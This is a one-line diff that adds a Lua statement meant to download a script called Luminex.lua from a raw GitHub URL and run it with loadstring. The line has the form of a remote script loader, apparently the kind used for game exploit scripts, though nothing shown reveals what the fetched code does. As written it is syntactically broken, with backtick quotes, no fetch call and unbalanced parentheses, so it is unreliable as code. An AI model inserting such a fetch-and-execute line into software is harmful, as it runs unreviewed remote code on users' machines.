@@ -1,0 +1,1 @@
+loadstring(``https://raw.githubusercontent.com/BorisLua/Luminex/main/Luminex.lua``))()
